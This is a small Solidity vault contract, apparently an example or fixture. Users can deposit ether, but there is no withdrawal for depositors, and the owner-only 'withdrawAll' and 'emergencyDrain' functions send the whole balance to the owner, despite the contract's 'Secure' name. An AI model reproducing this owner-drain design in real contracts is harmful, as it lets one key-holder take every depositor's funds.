// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract SecureVaultOwnable is Ownable {
    mapping(address => uint256) public balances;

    constructor() Ownable(msg.sender) {}

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() external onlyOwner {
        uint256 bal = address(this).balance;
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transfer failed");
    }

    function emergencyDrain() external onlyOwner {
        uint256 bal = address(this).balance;
        (bool success, ) = owner().call{value: bal}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}